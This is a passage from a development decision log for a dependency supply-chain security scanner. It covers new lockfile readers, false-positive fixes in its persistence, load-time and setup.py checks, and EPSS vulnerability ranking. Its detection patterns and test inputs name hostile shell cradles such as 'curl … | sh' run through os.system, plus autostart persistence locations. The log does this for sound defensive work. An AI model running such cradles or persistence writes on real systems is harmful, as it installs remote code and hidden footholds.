package that merely DEFINES but does not call an exec function still emits a load-time hook FACT — but it
stays non-escalating, since VC-002j requires the bundled-binary composition. `exports`-as-object is not
resolved this pass (the RedC2 case uses `main`). Gate-eligible, not block — a rare legitimate
load-time-binary case is flagged for human confirmation, not hard-blocked.

Proof: analyzer tests (entry-exec fires; pure-data entry silent; bundled ELF sibling surfaced with
CapExec; `nativeExecutableKind` across elf/pe/mach-o/js/short) and check tests (VC-002j fires on the
composition, silent without the bundled binary, silent on a plain lifecycle exec hook). The registry
drift guard requires VC-002j's registration. Full suite green (33/0), go vet silent, gofmt clean.

## D-100 — OPU-29 (Increment 2): pylock.toml (PEP 751) — the standardized PyPI lockfile

Builds the forward case D-97 deferred ("pylock.toml — same cheap path, implement on request once a real
lock is in hand"). pylock.toml is the standardized, tool-agnostic resolved lockfile approved in PEP 751
and maintained as a PyPA spec; uv, pipenv, pdm, and mousebender emit it, so a project locked with it was
previously unreadable on its richest input (fell back to the pyproject manifest). This adds Tier 4 of the
PyPI TOML-lockfile family alongside uv.lock / poetry.lock / pdm.lock — a line scanner over the constrained
TOML subset (D-10 forbids a third-party parser), reusing the uv reader's inline-table primitives and
poetry.lock's synthesized-root shape.

Three properties of PEP 751 shape the reader:

- **No root project.** The format records no project entry, so the root is synthesized and attached to the
  in-degree-zero packages (the effective direct set), disclosed via `pypi.direct_attribution =
  in-degree-zero` (the poetry/pdm shape).
- **Edges are OPTIONAL.** `[[packages.dependencies]]` is defined as purely informational (installers MUST
  NOT use it) and most tools omit it today. When present, the real transitive tree is built with real
  depths. When absent for EVERY package there is nothing to reconstruct, so the reader falls back to flat
  resolution and DISCLOSES it (`AttrFlatResolution`, D-24) exactly as Pipfile.lock does — presumed depth,
  never silently invented. When edges exist the penalty is intentionally NOT set.
- **Many source shapes.** Provenance may be an index (registry), or a vcs / directory / archive / sdist /
  wheels reference; these collapse to one `(class, ref)` by specificity: vcs→git, directory→path,
  archive→url, index→registry, then a bare sdist/wheel url→url.

Detection: recognized as a directory input (ranked with the fully-resolved TOML lockfiles, above the flat
Pipfile.lock), as a direct file, and as a named variant matching `^pylock\.([^.]+)\.toml$` (e.g.
`pylock.dev.toml`) per the spec's file-name rule.

Honest limits (documented, disclosed — not hidden): multi-marker duplicate packages use a last-wins name
map (poetry's simplification; a genuinely forked graph resolves to the last entry); edges are only as good
as the locker wrote them (flat-resolution disclosed when absent); `attestation-identities` / `tool` tables
are read past this pass; a version-less source-tree entry has no pinned identity and is skipped for node
creation and disclosed on its dependers (sibling convention).

Proof: six new tests — canonical PEP 751 example (cattrs→attrs edge, attrs at depth ≥2 transitive,
cattrs/numpy direct, NO flat penalty); edgeless lock (flat-resolution disclosed, all direct, inline sdist
url extracted cleanly without sweeping trailing hashes); source classification across registry/git/path/
url; empty-packages error; format-mismatch disclosed; filename detection incl. named variants and
negatives. Full suite green (33/0), go vet silent, gofmt clean. D-10 (stdlib line scanner) and D-24
(flat-resolution disclosure) honored.

This closes the pylock.toml forward case; of D-97's deferred list only `bun.lock` (JSONC; `bun.lockb`
binary) and `Pipfile` (manifest, not a lock) remain, both low-payoff, plus the no-adapter formats
(flake.lock / conan.lock / deno.lock / pom.xml) which are separate adapter work.

## D-101 — OPU-29 (Increment 3): bun.lock — Bun's text lockfile (npm ecosystem)

Builds a D-97 deferred forward case. bun.lock is the text lockfile Bun writes (default since Bun 1.2,
replacing the binary bun.lockb, which depSNORT cannot read and only disclosed as a gap). It is fully
resolved: a `workspaces` table gives the root project's direct dependencies and a `packages` table carries
one entry per resolved package with its own dependency set — so, like package-lock.json, the transitive
closure is observed fact, not presumption. The npm adapter now claims bun.lock in Detect and resolves it to
a real npm graph (pinned versions, provenance, edges), preferred over the bare package.json manifest.

**JSONC, not JSON.** bun.lock permits trailing commas and comments, which Go's encoding/json rejects.
Rather than hand-scan nested JSON, a small STRING-AWARE sanitizer (`stripJSONC`) removes line/block comments
and trailing commas — preserving a `//` or `,` inside a string value — and then the stdlib parser reads it.
encoding/json is stdlib, so this honors D-10 (no third-party parser) while being far more robust than a
hand-rolled nested-JSON reader. This is the family's first use of the strip-JSONC-then-stdlib approach
(the TOML/YAML readers are line scanners because Go ships no parser for those; it does ship JSON).

**Descriptor + metadata.** Each `packages` entry is a heterogeneous tuple `[name@version, registry,
{meta}, hash]`. `splitBunDescriptor` parses the name/version (scoped `@scope/pkg@1.2.3`, `npm:` aliases,
git/workspace refs all handled); the metadata object is the first tuple element that is a JSON object, and
its dependency maps become edges. `bunSource` maps the descriptor version to a provenance class: github:/
git+ → git, workspace:/file:/link: → path, http(s): → url, plain semver / npm-alias → registry. A
dependency's OWN devDependencies are not edged (npm/bun install semantics, matching resolveV2); the root
workspace's devDependencies ARE direct (the root project installs them).

**gap.go.** bun.lock is added to `adapterHandledLocks` so the pure gap classifier stays honest — bun.lock
ends in `.lock`, and without this the catch-all would mislabel a claimed-and-scanned lockfile as an unknown
gap.

Honest limits (documented): multi-version duplicates use a last-wins name map (a package pinned at two
versions resolves edges to the last; the common flat case is unaffected, mirroring poetry's
simplification); exotic descriptors (aliases, nested workspace paths) are best-effort — provenance still
classifies and identity still resolves.

Proof: a fixture with a comment, trailing commas, a scoped name, a devDependency, a git descriptor, and a
transitive chain scans to 7 nodes / 6 edges — react → loose-envify → js-tokens at real depths 1/2/3,
typescript (devDependency) correctly direct, @scope/util parsed, registry vs git sources classified. Four
unit tests (parse, stripJSONC in-string preservation, descriptor splitting, source mapping); full suite
green (33/0), -race clean, go vet silent, gofmt clean. D-04 (parse only, no execution) and D-10 preserved.

Of D-97's deferred list, only Pipfile (pipenv's manifest, not a lock) now remains among the in-adapter
readers; the four no-adapter formats (flake.lock / conan.lock / deno.lock / pom.xml) are separate
new-ecosystem work.

## D-102 — OPU-29 (Increment 4): Pipfile — pipenv's manifest (pypi ecosystem)

Closes the last in-adapter reader from D-97's deferred list. A Pipfile is pipenv's MANIFEST, not a
lockfile: it declares dependencies with constraints (often `"*"`) and resolves no versions or transitive
tree — that is `Pipfile.lock`'s job, which the pypi adapter already parses. So a Pipfile is handled exactly
like `pyproject.toml`: it produces a root whose declared deps ride on `graph.AttrDeclaredDeps` (so
expansion can presume a version, D-44), with the same flat-resolution disclosure a bare `requirements.txt`
carries (`AttrFlatResolution`, D-24).

Precedence and gating: reached ONLY when there is no `Pipfile.lock` in the directory (the lock is richer
and is preferred by `inputPath`), and ONLY when the Pipfile actually declares dependencies — gated by
`pipfileDeclaresDeps`, mirroring `pyprojectDeclaresDeps`. A Pipfile that declares none is left to the
existing coverage-gap disclosure, unchanged. No `gap.go` change is needed: the claim/skip logic handles
both a dep-declaring Pipfile (claimed and scanned) and a dep-less one (still a disclosed gap).

Line-scanned, not TOML-parsed (D-10): only the `[packages]` and `[dev-packages]` tables are read. The TOML
key is the package name; the value is a specifier string (`"*"`, `">=2.0"`) or an inline table
(`{version = "...", extras = [...]}`) whose version is taken (`"*"` when a table pins none, e.g. a
git/path dependency). Nothing is executed (D-04).

Proof: a Pipfile-only project resolves to root `source=Pipfile`, all four deps across both tables (incl.
the inline-table `flask >=2.0`) captured as declared + unresolved, `flat_resolution=pypi`; a no-deps
Pipfile errors (stays a gap); constraint extraction covers bare/quoted/inline-table/no-version. With a
`Pipfile.lock` present the lock wins (the manifest is not used) — the dir precedence ensures it. Three unit
tests; full suite green (33/0), -race clean, vet/fmt clean.

This exhausts D-97's in-adapter reader list (uv / poetry / pdm / pnpm / pylock / bun / Pipfile all done).
Only the four no-adapter formats remain — flake.lock / conan.lock / deno.lock / pom.xml — each a whole new
ecosystem adapter (Detect / Resolve / purl type / coverage plumbing / registration), not a
reader-into-existing-adapter; they stay disclosed as coverage gaps until built.

## D-103 — OPU-29 (Increment 5): uv.lock rootless-lock fix (synthesized root)

A live-fire scan of MoSLoF/open-webui (npm frontend + pypi backend) exposed a correctness bug in the
OPU-29 uv reader: it treated a uv.lock with NO editable/virtual self-entry as a fatal error —
`pypi: uv.lock declares no editable or virtual root project`. open-webui's lock is exactly that shape:
`version = 1, revision = 3`, every package `source = { registry }`, no self-entry — a valid uv form for an
APPLICATION (or a `uv pip compile` export), structurally identical to poetry.lock. The inter-package
`dependencies` edges were all present; only the project's own root entry was absent. Result: that project
failed to resolve on its richest input and fell back to `requirements.txt` (flat + expansion). Coverage was
disclosed as incomplete (never a false-clean), but the real uv graph was lost.

Fix: when `selectUvRoot` returns nil, synthesize a root (`rootNode`) and, after the inter-package edges are
built, attach the in-degree-zero packages to it as the effective direct set — the EXACT pattern
poetry.lock / pdm.lock / pylock.toml already use, disclosed via `pypi.direct_attribution = in-degree-zero`.
Because the lock carries real edges, the result is a real transitive tree with real depths — NO D-24 flat
penalty (unlike a manifest). The editable/virtual-root path (the common case) is untouched, so no
regression; the existing `attachUnrooted`/`assignDepths` passes still run for both paths.

Proof: `TestParseUvLockRootless` (rootless registry-only lock → synthesized in-degree-zero root, aiohttp
direct, aiohappyeyeballs/multidict transitive at real depth ≥2, no flat-resolution); mutation-proven
(reverting to the fatal error fails it with the exact live-fire message). `TestParseUvLock` (editable root)
unchanged. Live-fire recovery: open-webui's isolated uv.lock went from TOTAL FAILURE to 493 nodes / 878
edges (depths 0–4); the full re-scan resolved 3/3 projects (was 1 failed), recovering +129 pypi package
nodes and +30 previously-unsurfaced findings. Full suite green (33/0), -race clean, vet/fmt clean. D-10 and
D-24 preserved.

## D-104 — OPU-31 (follow-up): load-time marker precision (JS-context exec/network gate)

A meshclaw live-fire (dependency tree materialized via `npm install --ignore-scripts` — files on disk, no
lifecycle scripts run) exposed a false-positive class in the OPU-31 load-time analysis (D-99). `scanCaps`
is a substring scanner over shell / Ruby / PHP / PowerShell markers; `AnalyzeLoadTime` reused it directly,
and applied to ordinary bundled JS entry modules it mis-read library code as an execution surface. Because
the load-time hook gates on CapExec, each false EXEC fabricated a `module-load:` hook and dragged its
network/obfuscation facts along — escalating benign packages to a HIGH VC-002e. Observed: `ms` (a
`RegExp.exec()` read as exec), `lru-cache` (its own `.fetch()` method read as network), `buffer` /
`mqtt` / `@meshtastic/core` (`String.fromCharCode` + a backtick template literal + a JS bitwise `&` matched
as the PowerShell call operator → obfusc+exec HIGH). 11 load-time hooks, most false.

Fix (load-time gate ONLY — install-script/lifecycle analysis, which legitimately reads PowerShell/Ruby/npx,
is untouched, as is VC-002j): re-decide the load-time execution surface with JS-precise signals instead of
the shell markers.

- `jsLoadTimeExecRe` — a real JS exec reachable at import: `child_process`, `eval(`, `new Function(`,
  `vm.runIn` / `node:vm` / `require('vm')`. It deliberately OMITS the substring markers that FP on JS: a
  backtick template literal, a regex `.exec(`, a `system(` substring, a lone `spawn(`.
- Structural evidence markers are filtered to those meaningful in JS (`wildcard-exe:`, `download-cradle:`);
  a PowerShell call operator (`ps-call-operator:`, matching a JS bitwise `&`) and a package runner
  (`pkg-runner:`, a shell construct needing child_process to run — already covered) are excluded.
- `jsLoadTimeNetworkRe` — a bare global `fetch(` (NOT a `.fetch(` method call such as lru-cache's
  `cache.fetch()`), an http/https/net/tls/dgram/http2 module, WebSocket/XMLHttpRequest, or a known HTTP
  client; URL literals still count. When a load-time hook carries CapNetwork but no real JS network signal,
  the capability (and its `fetch(` marker) is dropped via `dropCap`.

The RedC2 path is preserved: `node:child_process` + a bundled native binary still gates true → VC-002j.

Proof: `loadtime_fp_test.go` — benign JS (regex `.exec`, template literal, method `.fetch`,
`String.fromCharCode`, bitwise `&`) yields NO hook; real exec (`child_process` / `eval` / `new Function`)
still fires with CapExec; a `.fetch()` method is not network while a bare `fetch(url)` is. All original
OPU-31 load-time tests (incl. the bundled-native-binary RedC2 shape and the esbuild `fromCharCode`
regression) still pass. meshclaw result: load-time hooks 11 → 0 (all were false), verdict 0/14/2 → 0/6/0,
while every real signal is preserved (the 4 VC-002a lockfile hook facts and the 2 genuine prepublish
`npm install -g` network hooks on smart-buffer / socks). Full suite green (33/0), -race clean, vet/fmt
clean. D-04 / D-10 preserved.

## D-105 — OPU-19 (follow-up): VC-002g persistence — Startup-folder precision

An OpenShell live-fire (Rust + Python) exposed a false-positive in VC-002g persistence (D-28/OPU-19). The
`persistenceMarkers` set carried the bare substring `"startup"` — intended for the Windows Startup folder —
which `IsPersistenceMarker` treats as boot/login persistence (the HIGH gate). depSNORT fetched sdists and
statically parsed setup.py / .pth (D-04: parse, never execute) and raised 3 VC-002g HIGH findings, none of
which touches an OS autostart location:

- coverage 7.13.2 `.pth`: `coverage.process_startup(slug="pth")` — the substring matched the FUNCTION NAME
  `process_startup`, not a Startup folder.
- setuptools 80.10.2 setup.py: the only `"startup"` occurrences are in a CODE COMMENT ("…implicit behavior
  on startup…") — matched because Python `#` comments are not stripped (`stripCodeComments` is C-family
  only).

Fix (scoped to the one marker): remove the bare `"startup"` substring from `persistenceMarkers`; add
`startupFolderRe = (?i)shell:(?:common )?startup|programs[\\/]+startup`, which emits a precise
`startup-folder` marker (CapFilesystem) matching only a real autostart location; `IsPersistenceMarker`
recognizes `startup-folder`. Every other persistence marker (cron, systemd, launchd, shell profiles,
`$PROFILE`, `.git/hooks`) is untouched, and a genuine Startup-folder write still raises VC-002g.

Proof: `persistence_fp_test.go` — `process_startup`, an "on startup" comment, and the word "startup" raise
NO persistence marker; `shell:startup`, `shell:common startup`, and a `...\Programs\Startup` path (back- or
forward-slash) DO. The OPU-19 probe/split test is updated (`startup-folder` is the persistence marker; bare
`startup` and `process_startup` are explicitly benign). Mutation-proven: re-adding the bare `"startup"`
substring fails the benign cases. OpenShell result: VC-002g HIGH 3 → 0, verdict 0/4/59 → 0/1/59 (the
remaining gate-eligible is maturin's setup.py network VC-002b, a plausible real signal); all other findings
(VC-008 ×33, VC-004 ×17, …) unchanged. Full suite green (33/0), -race clean, vet/fmt clean.

Noted, NOT bundled (follow-up): `stripCodeComments` strips only C-family comments, so Python `#` prose can
still match other substring markers — worth a separate pass so scanner markers can't match Python comments.

## D-106 — npm-registry packument scripts: tolerant parse (Kibana live-fire)

A Kibana live-fire exposed a robustness bug in the npm-registry datasource. The packument client typed
`packumentVersion.Scripts` as `map[string]string`, but npm packuments preserve historical junk: joi 0.1.x
(10 versions) stored the `blanket` and `travis-cov` CONFIG OBJECTS under `"scripts"` (a 2013-era habit).
One object-valued entry aborts the ENTIRE packument unmarshal —
`json: cannot unmarshal object into ... scripts of type string` — so every version of joi loses
npm-registry coverage (existence, per-version publisher/actor, lineage), degrading the whole npm-registry
axis for that package (the joi-rooted project fell back to expand-only).

Fix: a tolerant `scriptMap` type (underlying type `map[string]string`, so `installHooksOf(v.Scripts)` is
unchanged and assignable) with a custom `UnmarshalJSON` that decodes to `map[string]json.RawMessage`, keeps
the string-valued entries (the real script bodies), and drops non-string config objects. One malformed
field can no longer nuke registry coverage for an entire package. Well-formed packuments parse identically.

Proof: `TestPackumentTolerantScripts` (joi-shaped packument — object-valued `blanket`/`travis-cov` dropped,
the `postinstall` string body kept, a later clean version still parses, `installHooksOf` intact over the
survivors). Mutation-proven: reverting to `map[string]string` fails with the exact live-fire unmarshal
error. Full suite green (33/0), -race clean, vet/fmt clean.

Note (not part of this fix): the Kibana run's 3 BLOCK verdicts were accurate — known-malicious OSV MAL-*
matches on `kbn-check-prod-native-modules-cli` TEST FIXTURES whose placeholder names (package-x,
native-module2) now collide with real squatted npm packages: a genuine dependency-confusion exposure in
test infra, correctly flagged and separate from this parser fix.

## D-107 — npm-registry packument "time": tolerant parse (Kibana follow-up to D-106)

With the D-106 scripts fix merged, re-scanning Kibana surfaced the next packument failure, the same abort in
a sibling field: `parsing packument for package-a: json: cannot unmarshal object into ... packument.time of
type string`. The `time` field (a version→timestamp map) was `map[string]string`, and a stray object value
aborts the whole packument — identical failure mode to scripts, different field.

Fix: generalize the tolerant type from D-106 (`scriptMap` → `tolerantStrMap`) and apply it to BOTH brittle
packument string-maps — `packument.Time` and `packumentVersion.Scripts`. One tolerant type now guards both;
the underlying type is still `map[string]string`, so all consumers (the `range p.Time` timestamp loop,
`installHooksOf`) are unchanged. A single malformed registry field can no longer sink a package's entire
registry coverage.

Proof: `TestPackumentTolerantTime` (object-valued `time` entry dropped, string timestamps and versions
preserved) alongside the retained `TestPackumentTolerantScripts`. Full suite green (33/0), -race clean,
vet/fmt clean. Kibana registry axis is now fully covered (both joi and package-a packuments parse); the only
remaining coverage note is the inherent transitive-expansion presumption ("expand"), disclosed as a lower
bound. Definitive Kibana result: 5,618 nodes / 15,986 edges across 12 sub-projects; 3 block (accurate OSV
MAL-* matches on test-fixture names colliding with real squatted npm packages — a dependency-confusion
exposure in test infra) / 6 gate-eligible / 147 advisory.

## D-108 — OPU-28 (Inc. 3 follow-up): VC-002i init-reachability scoping (elastic-agent live-fire)

An elastic-agent live-fire exposed a false positive in VC-002i (build-tag-gated init evasion, D-93).
`analyzeConstrainedInit` gated on `(build-tag AND an init() exists AND a dangerous capability appears
ANYWHERE in the file)` — whole-file attribution, never verifying the init actually REACHES the capability.
elastic-agent's `magefile.go` (`//go:build mage`) fired HIGH: its `init()` is byte-identical to upstream and
only registers mage targets (`common.RegisterCheckDeps(Update)` / `RegisterDeps`); the network/credential
code lives in SEPARATE, explicitly-invoked mage targets. The fork injected no payload (diff vs upstream =
version drift only) — a standard build tool called a hidden runtime backdoor.

Fix: scope the capability scan to what AUTO-RUNS at import. New `initReachableSource` (stdlib `go/ast` /
`go/parser` / `go/token`, D-10-clean) computes the import-time closure — `init()` bodies + package-level var
initializers + every LOCAL function transitively reachable from them by a direct call (BFS with a visited
set) — and `scanCaps` runs on that closure, not the whole file. `common.RegisterCheckDeps(Update)` is an
EXTERNAL registrar (its `Update` argument is register-for-later, not followed), so the closure is just the
init body → no network/creds → no finding.

Blind-spot guards (the fix must never trade a FP for a false negative): a multi-hop payload (a helper called
by init at any depth) is in the closure and still fires; a LOCAL callee receiving a LOCAL function VALUE
(which it may invoke at import) forces a fallback to the whole-file scan; an EXTERNAL registrar receiving a
value does NOT (that clears the mage FP); an unparseable file falls back to the whole-file scan. The fallback
is always toward MORE scanning, so the change can only remove FPs, never create FNs — except the precise
target class (caps in unrelated, explicitly-invoked functions). The alternative simple fix — allowlisting
the mage build tag — was REJECTED: it would blind the check to a real payload hidden IN a magefile init;
reachability scoping preserves that detection.

Proof: `constrained_init_reach_test.go` — the mage-shape (external registrar) and a cap in an unreached
function stay SILENT (FP cleared); a payload reached directly, two hops down, via higher-order LOCAL
dispatch, from a package-var initializer, or in an unparseable file all STILL FIRE (no blind spot). The
existing OPU-28 `TestAnalyzeGo_ConstrainedInit` (all positives fire, all negatives silent) is unchanged.
Mutation-proven: reverting to the whole-file scan makes both FP cases wrongly fire. Only the capability SET
feeds the finding (`caps, _ := scanCaps(...)`), so scan-text order does not affect output (D-09 safe). Live-
fire: elastic-agent VC-002i 1 → 0, verdict 0/1/43 → 0/0/43, everything else identical. Full suite green
(33/0), -race clean, vet/fmt clean.

## D-109 — OPU-19 (follow-up): persistence markers match on word boundaries (beats live-fire)

A beats live-fire exposed another VC-002g persistence false positive (sibling of D-105's `startup` fix). The
identifier-shaped persistence markers were matched with `strings.Contains`, so `systemd` (Linux init) matched
as a raw substring of the mkwinsyscall Windows system-DLL flag in a go:generate directive —
`//go:generate mkwinsyscall.exe -systemdll -output …` — firing VC-002g HIGH on the beats root.

Fix: identifier-shaped persistence markers (`systemd`, `crontab`, `systemctl`, `launchctl`, `launchd`,
`LaunchDaemons`, `LaunchAgents`) now match on WORD BOUNDARIES via a lightweight `containsWord` (a `\bword\b`
bounded by non-identifier chars or string edges, both args pre-lowercased); `isWordMarker` selects them (all
chars are letters/digits/`_`). Punctuation-anchored markers (`.bashrc`, `/etc/`, `$PROFILE`,
`core.hooksPath`, `.git/hooks/`, …) are specific enough to stay raw substring matches. Only the persistence
marker scan changed; the other capability scans (`installWriteMarkers`, cradle/obfuscation, …) are untouched.

Blind-spot guard: bare `launchd` previously caught the macOS auto-run dirs `LaunchDaemons`/`LaunchAgents` by
substring; word-boundary matching would break that (`launchd` inside `launchdaemons` is not a word), so those
two dirs are added as explicit markers — macOS auto-run coverage is preserved and `LaunchAgents` (never
caught before) is a bonus gain. `IsPersistenceMarker` recognizes them automatically (they are in
`persistenceMarkers`, matched case-insensitively).

Proof: `TestPersistenceWordBoundary` — `-systemdll`, `import crontabber`, `systemdConfigParser` stay SILENT;
`/etc/systemd/system/`, `systemctl enable`, `crontab -e`, `~/Library/LaunchAgents/`,
`~/Library/LaunchDaemons/`, `.bashrc` all FIRE. `TestContainsWord` pins the boundary semantics (incl.
`launchdaemons` not matching `launchd`). Existing persistence/OPU-19/git-hook tests unchanged.
Mutation-proven: reverting to pure `strings.Contains` makes all three FP cases wrongly fire. Only the
capability SET feeds the finding, so evidence-order is irrelevant (D-09 safe). beats: VC-002g HIGH 1 → 0,
verdict 0/4/38 → 0/3/38, everything else identical. Full suite green (33/0), -race clean, vet/fmt clean.

Noted, offered next (separate): the 3 remaining gate-eligible on beats are VC-002b "setup.py reaches
network" on backoff/deprecated/pyasn1 — URLs + network words matched inside the setup.py long_description
README string and `url=` metadata, not an actual egress call; a distinct fix would require a real network
call, not string-literal content.

## D-110 — VC-002b: setup.py documentation-field network precision (beats live-fire follow-up)

The final beats live-fire false positive (offered in D-109's note). VC-002b "setup.py reaches network" fired
gate-eligible on backoff / deprecated / pyasn1 because the network capability was scanned over the whole
setup.py, and their `long_description` (an embedded README) and `description` carry example code and tool
names — `requests.get(...)`, `httpx.get()`, `urllib.request.urlopen()`, `curl ...` — that are documentation,
not install-time egress. `analyzeSetupPy` already stripped URLs before the scan (README badges / homepage),
but network CLIENT-NAME markers are not URLs, so they survived and raised CapNetwork.

Fix: strip the string-literal VALUE of the documentation metadata keywords (`long_description` /
`description`) before capability scanning — extending the existing "metadata is not code" URL-strip to the
prose fields that carry those markers. A string literal passed to `setup()` never executes, so markers
inside it are inert. Deliberately scoped to these two doc fields ONLY: an arbitrary string literal is NOT
stripped, so a shell cradle in `os.system("curl x | sh")` (a command string, not a doc field) still raises
CapNetwork/CapExec; and real egress in module-level code or a cmdclass body is untouched. RE2 has no
backreferences, so each quote form is handled explicitly, triple-quoted first; both the keyword-arg
(`long_description=`) and dict-entry (`'long_description':`) forms are matched, while
`long_description_content_type` is not (the `\b` after the key fails before the `_`).

Proof: `TestSetupPyReadmeNetworkWordsNotNetwork` (a backoff-shaped README with requests/httpx/urllib/curl
examples in `long_description` + `description` raises NO CapNetwork) and
`TestSetupPyCradleInCommandStringStillDetected` (a `curl … | sh` cradle in `os.system(...)` still fires,
guarding against over-stripping). Mutation-proven: the FP test fails against the pre-fix code with evidence
`[curl  urllib.request urlopen( requests.get httpx.]`. Existing setup.py tests
(`TestSetupPyRealNetworkEgressStillDetected`, README-URL, metadata-URL, comment/error-URL) all unchanged.
Full suite green (33/0), -race clean, vet/fmt clean. This clears the last beats gate-eligible FP; the
remaining beats findings (VC-008 known-vuln, VC-004 dormancy, etc.) are genuine.

## D-111 — VC-002b: setup.py inert-text network precision (completes D-110; beats live-fire)

Re-scanning beats after D-110 showed the "setup.py reaches network" FP persisting on backoff / deprecated /
pyasn1 — three inert-text shapes the doc-field strip did not fully cover, including a real bug in D-110's own
regex:

- **backoff 2.2.1**: README in a poetry `long_description` string literal. D-110's single-line strip used
  `'[^'\n]*'`, which closed early on the first ESCAPED quote (`Reitz\'s`), leaving the rest of the README
  (with `requests.get`, `aiohttp`) to trip the scan. Fixed by matching a proper literal:
  `'(?:[^'\\\n]|\\.)*'` (and the `"` form), so `\'` no longer terminates it.
- **deprecated 1.2.14**: README IS the module docstring (`u"""…"""`), used via `long_description=__doc__`.
  A leading `u`-prefixed docstring was not recognized as inert.
- **pyasn1 0.4.8**: `wget https://…/ez_setup.py` inside a `print()` error message — a shell-tool word with
  no way to run it, and setup.py `#` comments were never stripped at all.

Fix (three parts, all in the setup.py scan path):

1. **Escaped-quote-aware** single-line doc-string strip (above).
2. **`stripPyInert`** — a string-aware single pass that removes `#` comments and the leading module docstring
   (with `r/b/u/f` prefixes) before scanning. A `#` or keyword INSIDE a string literal (the command in
   `os.system("curl x | sh")`) is PRESERVED — only provably non-executing text (a docstring stored as
   `__doc__`, a comment) is removed. String VALUES of assignments/args/dict entries are kept, since those can
   be behavior.
3. **Shell-sink gate** — a shell-tool network word (`curl `/`wget `/`certutil`/`bitsadmin`/`finger.exe`/
   `msiexec`) counts as egress only when a network-LIBRARY call (`urlopen(`, `requests.get`, `Net::HTTP`, …)
   OR a shell-exec sink (`os.system`, `subprocess`, `Popen`, `os.popen`, `exec(`/`eval(`, `shell=True`) is
   present. A bare `wget URL` with no way to run it is inert. (The overbroad `.run(`/`.call(` sink patterns
   were deliberately NOT used — they match `unittest`'s `.run(suite)`; real subprocess use always contains
   `subprocess`/`Popen`.)

Blind-spot guards, all proven: a network LIBRARY call is never suppressed; a shell-tool word is suppressed
only when nothing in the file can run it; command strings passed to `os.system`/`subprocess` are preserved by
the string-aware strip.

Proof: `TestSetupPyInertNetwork` — 4 inert shapes silent (README literal with escaped quotes; README as
`__doc__`; `wget` in a `print()`; payload word in a `#` comment), 5 genuine-egress shapes still fire
(module-level `urlopen`; `requests.get`; `os.system('curl … | sh')`; `os.system('wget …')`;
`subprocess.run(shell=True)`). Mutation-proven: disabling `stripPyInert` + the shell-sink gate makes the
comment / docstring / wget-in-print cases wrongly fire. D-110's setup.py tests all still pass. Full suite
green (33/0), -race clean, vet/fmt clean. beats is now clean of gate-eligible findings (VC-002b setup.py-
network 3 → 0; verdict 0/4/38 → 0/0/38; VC-008/VC-004 advisories unchanged). This also closes the long-open
Python-comment-stripping thread for setup.py.

## D-112 — EPSS enrichment, Increment 1: the FIRST.org data source

Adds a new, self-contained data source `internal/datasource/epss` that fetches FIRST.org EPSS scores — the
Exploit Prediction Scoring System probability (0..1) that a CVE will be exploited in the wild in the next 30
days, plus a percentile rank. The purpose is to turn a flat VC-008 list ("96 vulnerable packages") into a
prioritized one ("these few have EPSS > 0.5"): of beats' 33 or Kibana's 96 vulnerable packages, which are
actually being exploited (Log4Shell CVE-2021-44228 → 0.99999 / 100th pct; a typical stale-but-quiet CVE
< 0.01).

The client mirrors the osv/depsdev shape (`Client{HTTP, Cache, Endpoint, Offline, Now, Stats}`, `New`,
`Name`, tiered cache → live → gap): `epss.New(cache, offline).Scores(ctx, cves) → map[CVE]{EPSS,
Percentile, Date}`. Batches by 100 CVEs/call (the API page limit; 96 → 1 call, 250 → 3). Stdlib-only (D-10);
read-only (D-04); cached per-CVE; offline-aware — offline serves cached scores and discloses the rest as
gaps, never invents a score. Input is normalized: upper-cased, de-duplicated, deterministically sorted, and
restricted to CVE-shaped IDs (GHSA/GO/PYSEC are ignored — EPSS is CVE-keyed). A CVE with no published score
is a gap, not an error; a partial-batch fetch error returns what succeeded plus the first error.

This increment is the reusable client ONLY — it touches no existing file and wires into no check yet, so it
is inert until Increment 2. Proof: six unit tests over a fake transport (parse + gaps, batch-by-100, cache
reuse, offline-from-cache, offline-cold-cache-is-gap-not-error, CVE normalization); full suite green (34
packages, 33 + the new one), -race clean, go vet silent, gofmt no diffs. No live network in CI.

Increment 2 (wiring into VC-008) is DEFERRED pending a design confirmation: EPSS is CVE-keyed, but OSV's
querybatch (what depSNORT uses) returns GHSA/GO IDs with NO aliases, so the wiring needs advisory→CVE
resolution. Two options — a cached, deduplicated OSV `/v1/query` per unique non-CVE advisory ID (isolated, no
change to the OSV core), or capturing aliases during the existing OSV pass. The former is recommended; the
finding attachment would add peak EPSS to each VC-008 finding's evidence + a sortable field, gated behind a
`-no-epss` flag and skipped when offline / `-no-osv`.

## D-113 — EPSS enrichment, Increment 2: VC-008 wiring + advisory→CVE resolution

Wires the D-112 client into the report. VC-008 now annotates each known-vulnerability finding with the PEAK
EPSS across its CVEs and orders the whole set by that peak, so the vulnerabilities most likely to be exploited
in the wild surface first — the difference between "96 vulnerable packages" and "the 4 that matter this week".
The evidence gains a suffix `; peak EPSS 0.999 (CVE-2021-44228, 100th pct)`; findings with no scored CVE keep
their SortedNodes position (the sort is `sort.SliceStable` on peak descending, so ties and no-EPSS entries
retain the existing deterministic order — D-09/D-13 preserved). When `ctx.EPSS` is empty (the default, and
whenever offline) VC-008 is byte-for-byte what it was before this increment.

Advisory→CVE resolution takes the isolated option floated in D-112, not the alternative: a new
`(*osv.Client).CVEAliases` issues a cached, de-duplicated `/v1/query` per unique vulnerable coordinate and
maps advisory ID → its CVE aliases (CVE-only; PYSEC/OSV/GHSA aliases dropped since EPSS cannot use them). This
is necessary because depSNORT's core path uses OSV `/v1/querybatch`, which returns GHSA-/GO- IDs with NO
aliases — a GHSA-primary advisory otherwise carries no CVE and EPSS (CVE-keyed) cannot score it. The core
querybatch path is untouched; `CVEAliases` runs only under `-epss`. Offline is cache-only and a miss is a
silent gap (never an error), matching the datasource contract.

Reversal from D-112's stated plan: the flag is opt-in `-epss` (default off), not the previously-floated
`-no-epss` (default on). EPSS enrichment costs one extra `/v1/query` per vulnerable coordinate plus the EPSS
batch call, all live network — making it opt-in keeps the default scan's network profile unchanged and honors
`-offline`/`-no-osv` (the whole block is skipped when `!*offline` is false). The enrichment merges resolved
CVE aliases back into `ctx.Advisories[*].Aliases` so downstream consumers see them too, and registers an
`emit.DataSourceCoverage` entry for EPSS so gaps are disclosed (D-24 honesty).

Proof: two VC-008 tests (peak-EPSS annotation resolved through a GHSA→CVE alias + ranking highest-first;
no-EPSS run is unchanged) and two `osv.CVEAliases` tests (resolve + CVE-only filter + per-coord dedup to one
call; offline cold cache is empty-with-no-error). Mutation-proven: reversing the rank comparator and
corrupting the annotation format each fail the VC-008 test; restore green. Full suite green (34 packages),
